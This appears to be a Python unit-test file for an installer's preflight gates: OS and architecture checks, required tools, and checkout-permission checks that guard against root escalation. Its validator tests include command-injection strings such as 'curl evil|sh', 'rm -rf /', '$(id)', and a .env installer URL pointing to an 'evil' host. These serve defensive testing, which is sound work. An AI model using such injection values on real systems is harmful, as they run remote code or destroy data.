"""Preflight gates: os-release fixtures (the Debian-no-ID_LIKE trap), the arch
allowlist, dry-run-warns vs real-run-raises, the tool floor."""
from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))
sys.path.insert(0, str(REPO / "tests" / "unit"))

from fakes import capturing_reporter, make_config, quiet_reporter  # noqa: E402
from vide import preflight, system  # noqa: E402
from vide.errors import ConfigError, UnavailableError  # noqa: E402
from vide.executor import Executor  # noqa: E402

DEBIAN = 'ID=debian\nPRETTY_NAME="Debian GNU/Linux 13 (trixie)"\nVERSION_ID="13"\n'
UBUNTU = 'ID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 24.04.1 LTS"\n'
FEDORA = 'ID=fedora\nID_LIKE="rhel centos"\nPRETTY_NAME="Fedora 41"\n'


class TestOsRelease(unittest.TestCase):
    def _parse(self, text: str):
        with tempfile.NamedTemporaryFile("w", suffix="os-release") as f:
            f.write(text)
            f.flush()
            return system.os_release(Path(f.name))

    def test_debian_has_no_id_like_and_fields_stay_aligned(self) -> None:
        osr = self._parse(DEBIAN)
        self.assertEqual(osr.id, "debian")
        self.assertEqual(osr.id_like, "")  # missing key ≠ misaligned neighbour
        self.assertEqual(osr.pretty_name, "Debian GNU/Linux 13 (trixie)")

    def test_ubuntu(self) -> None:
        osr = self._parse(UBUNTU)
        self.assertEqual((osr.id, osr.id_like), ("ubuntu", "debian"))

    def test_quotes_and_spaces_preserved(self) -> None:
        osr = self._parse(FEDORA)
        self.assertEqual(osr.id_like, "rhel centos")

    def test_missing_file_is_none(self) -> None:
        self.assertIsNone(system.os_release(Path("/nonexistent")))


class TestPlatformGate(unittest.TestCase):
    def _gate(self, *, os_text: str, machine: str, dry_run: bool):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            osr = tmp / "os-release"
            osr.write_text(os_text)
            cfg = make_config(tmp, os_release_file=osr, uname_m=machine)
            rep = quiet_reporter()
            ex = Executor(dry_run=dry_run, reporter=rep, cfg=cfg)
            with mock.patch.object(preflight.system, "systemd_present",
                                   return_value=True):
                preflight.platform_gate(cfg, ex, rep)

    def test_debian_x86_64_passes(self) -> None:
        self._gate(os_text=DEBIAN, machine="x86_64", dry_run=False)

    def test_ubuntu_arm64_passes(self) -> None:
        self._gate(os_text=UBUNTU, machine="aarch64", dry_run=False)

    def test_fedora_refused_with_config_78(self) -> None:
        with self.assertRaises(ConfigError) as cm:
            self._gate(os_text=FEDORA, machine="x86_64", dry_run=False)
        self.assertEqual(int(cm.exception.code), 78)
        self.assertIn("fedora", str(cm.exception))

    def test_armv7l_refused_it_would_half_install(self) -> None:
        for bad in ("armv7l", "i686", "riscv64"):
            with self.assertRaises(ConfigError):
                self._gate(os_text=DEBIAN, machine=bad, dry_run=False)

    def test_dry_run_warns_instead_of_dying(self) -> None:
        # A preview must run on ANY box — skipping an assertion, never a mutation.
        self._gate(os_text=FEDORA, machine="armv7l", dry_run=True)

    def test_arch_allowlist_is_exactly_the_standalone_binary_set(self) -> None:
        self.assertEqual(preflight.SUPPORTED_MACHINES,
                         {"x86_64", "amd64", "aarch64", "arm64"})


class TestToolsGate(unittest.TestCase):
    def test_floor_is_the_documented_set_and_excludes_apt(self) -> None:
        self.assertEqual(set(preflight.REQUIRED_TOOLS),
                         {"curl", "openssl", "ss", "systemctl"})
        self.assertNotIn("apt-get", preflight.REQUIRED_TOOLS,
                         "the distro gate is the stronger assertion of the same fact")

    def test_missing_tool_raises_69(self) -> None:
        rep = quiet_reporter()
        with tempfile.TemporaryDirectory() as td:
            cfg = make_config(Path(td))
            ex = Executor(dry_run=False, reporter=rep, cfg=cfg)
            with mock.patch.object(preflight.system, "have_cmd",
                                   side_effect=lambda c: c != "ss"):
                with self.assertRaises(UnavailableError) as cm:
                    preflight.tools_gate(ex, rep)
        self.assertIn("ss", str(cm.exception))


class TestCheckoutGate(unittest.TestCase):
    """`sudo ./install.sh` executes the checkout AS ROOT and `.env` is
    root-equivalent in full — two installer URLs are fetched-and-executed as
    root, and every key in the file is injected into the environment each root
    child inherits — so whoever can write the tree has root at the operator's
    next converge. The predicate is deliberately NOT
    'root-owned' — that would refuse the README's own quick-start clone — but
    'writable only by principals already entitled to root'."""

    def _gate(self, repo: Path, *, uids=frozenset({0}), dry_run=False,
              walk_root=None, writers=lambda gid: frozenset()):
        # walk_root defaults to the tree's own parent: every temp dir lives
        # under /tmp, /tmp is 0o1777, and an unbounded walk therefore refuses
        # every fixture for the RIGHT reason — which is itself asserted, once,
        # in test_a_world_writable_ancestor_is_refused.
        # `writers` defaults to an empty group, i.e. the user-private-group case
        # every Debian/Ubuntu box actually has.
        rep, buf = capturing_reporter()
        preflight.checkout_gate(repo, dry_run=dry_run, rep=rep, trusted_uids=uids,
                                walk_root=walk_root or repo.parent,
                                group_writers=writers)
        return buf.getvalue()

    def _tree(self, td: str) -> Path:
        repo = Path(td) / "vide"
        (repo / "src").mkdir(parents=True)
        (repo / "units").mkdir()
        for f in ("install.sh", "vide", ".env"):
            (repo / f).write_text("x\n")
        return repo

    def test_a_clean_tree_owned_by_the_caller_passes(self) -> None:
        # The documented first run: alice clones into her own home and sudos.
        # She can already reach root; writing her own checkout is no escalation.
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            self._gate(repo, uids=frozenset({0, uid}))  # must not raise

    def test_an_untrusted_owner_is_refused_by_name(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            # uid 0 only, while the tree belongs to the test runner: bob's-sudo
            # -on-alice's-clone, which is exactly the escalation.
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0}))
            self.assertIn("not the sudo caller", str(cm.exception))

    def test_a_group_with_other_members_is_refused(self) -> None:
        # A `chmod g+w` for a shared `developers` group is the realistic
        # multi-tenant vector.
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            (repo / "install.sh").chmod(0o664)
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0, uid}),
                           writers=lambda gid: frozenset({uid, 4242}))
            self.assertIn("4242", str(cm.exception))

    def test_a_world_writable_subpackage_is_refused(self) -> None:
        """The hole the enumeration had, and the reason it is now a WALK.

        `src/vide/tui/` was missing from BOTH gate halves — it is imported as root
        on every wizard install — and `src/vide` was missing from this one while
        the bash half listed it. Neither was noticed, because a list of entries
        has to be extended whenever a subpackage is added and nobody adding one is
        reading this file. Every ancestor here is spotless; only the leaf is not.
        """
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            tui = repo / "src" / "vide" / "tui"
            tui.mkdir(parents=True)
            (tui / "session.py").write_text("x\n")
            tui.chmod(0o777)   # no cleanup needed: 0777 does not block rmtree,
                               # and an addCleanup here would fire after
                               # TemporaryDirectory had already removed the path
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0, uid}))
            msg = str(cm.exception)
            self.assertIn("tui", msg, "the refusal must name the path it refused")
            self.assertIn("world-writable", msg)

    def test_a_world_writable_file_inside_a_clean_tree_is_refused(self) -> None:
        # Directories were the obvious half; a file root imports is the other.
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            f = repo / "src" / "vide.py"
            f.write_text("x\n")
            f.chmod(0o666)
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0, uid}))
            self.assertIn("world-writable", str(cm.exception))

    def test_the_refusal_leads_with_re_clone_and_names_pycache(self) -> None:
        """A remedy that restores permissions and implies it restores trust is
        worse than none: this gate asks "can a third party write this NOW", never
        "has one ever", so if the answer was ever yes the CONTENTS are suspect.
        And `__pycache__` is gitignored, so it appears in no diff, is loaded in
        preference to the .py that was reviewed, and survives a chown untouched."""
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0}))
            msg = str(cm.exception)
            self.assertLess(msg.index("re-clone"), msg.index("chown -R root:"),
                            "the remedy must lead with re-clone, not with modes")
            self.assertIn("__pycache__", msg)
            self.assertIn("git clean -xdf", msg, "…and warn that it eats .env")
            self.assertIn("journalctl", msg,
                          "a gate that can refuse every verb must name what "
                          "still works without it")

    def test_a_user_private_group_is_NOT_refused(self) -> None:
        """The case that broke the first predicate, kept as a regression.

        Debian and Ubuntu default to umask 002 and to user-private groups, so a
        plain `git clone` produces a 0775 tree owned by `alice:alice`. A gate
        refusing `mode & 0o022` would refuse the README's own quick-start clone
        on a stock box — measured on a real box, not reasoned about."""
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            for p in (repo, repo / "src", repo / "units"):
                p.chmod(0o775)
            for f in ("install.sh", "vide", ".env"):
                (repo / f).chmod(0o664)
            self._gate(repo, uids=frozenset({0, uid}),
                       writers=lambda gid: frozenset({uid}))  # must not raise

    def test_an_unresolvable_group_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            (repo / "install.sh").chmod(0o664)
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0, uid}), writers=lambda gid: None)
            self.assertIn("does not resolve", str(cm.exception))

    def test_world_writable_is_refused_whatever_the_group_says(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            (repo / "install.sh").chmod(0o666)
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0, uid}),
                           writers=lambda gid: frozenset({uid}))
            self.assertIn("world-writable", str(cm.exception))

    def test_a_world_writable_ancestor_is_refused(self) -> None:
        # /tmp/vide is the classic hostile location: a 0755 tree inside a 0777
        # directory can be renamed out from under root.
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            Path(td).chmod(0o1777)
            try:
                with self.assertRaises(ConfigError) as cm:
                    # walk_root ABOVE the tree, so the hostile parent is in scope
                    self._gate(repo, uids=frozenset({0, uid}), walk_root=Path(td))
            finally:
                Path(td).chmod(0o700)
            self.assertIn("world-writable", str(cm.exception))

    def test_a_symlinked_env_is_refused_even_when_its_target_is_clean(self) -> None:
        # The whole attack: a root-owned .env symlinked from somewhere the
        # attacker can repoint. lstat sees the link; stat would report the
        # innocent target.
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            target = Path(td) / "elsewhere.env"
            target.write_text("x\n")
            (repo / ".env").unlink()
            (repo / ".env").symlink_to(target)
            with self.assertRaises(ConfigError) as cm:
                self._gate(repo, uids=frozenset({0, uid}))
            self.assertIn("symlink", str(cm.exception))

    def test_a_missing_env_is_fine(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            uid = repo.stat().st_uid
            (repo / ".env").unlink()
            self._gate(repo, uids=frozenset({0, uid}))  # must not raise

    def test_dry_run_warns_and_names_the_path_but_never_the_contents(self) -> None:
        # A preview mutates nothing, and --dry-run is how an operator diagnoses
        # a refusal — a gate that dies in preview cannot explain itself.
        with tempfile.TemporaryDirectory() as td:
            repo = self._tree(td)
            (repo / ".env").write_text("VIDE_NVM_INSTALLER_URL=http://evil/x\n")
            out = self._gate(repo, uids=frozenset({0}), dry_run=True)
        self.assertIn("preflight (dry-run)", out)
        self.assertIn(str(repo), out)
        self.assertNotIn("evil", out, "the gate must never print the file body")

    def test_trusted_uids_come_from_the_process_environment_only(self) -> None:
        # A VIDE_* seam that widened this set would be a waiver by another name,
        # and would be settable from the very .env the gate exists to judge.
        self.assertEqual(preflight.trusted_uids_from_env({}), frozenset({0}))
        self.assertEqual(preflight.trusted_uids_from_env({"SUDO_UID": "1000"}),
                         frozenset({0, 1000}))
        for junk in ("", "  ", "root", "-1", "1000; rm -rf /"):
            self.assertEqual(preflight.trusted_uids_from_env({"SUDO_UID": junk}),
                             frozenset({0}), f"junk SUDO_UID {junk!r} widened the set")


class TestPnpmSubdirShape(unittest.TestCase):
    def test_it_refuses_what_would_break_out_of_the_profile_assignment(self) -> None:
        from vide.node import check_pnpm_subdir
        for bad in ('x"; curl evil|sh; #', "/abs", "../escape", "a/../b", "a b",
                    "x\nPATH=/evil", "$(id)", "`id`", ""):
            with self.assertRaises(ConfigError, msg=f"accepted {bad!r}"):
                check_pnpm_subdir(bad)
        for good in (".local/share/pnpm", "pnpm", "a_b-c.d/e"):
            self.assertEqual(check_pnpm_subdir(good), good)


if __name__ == "__main__":
    unittest.main()
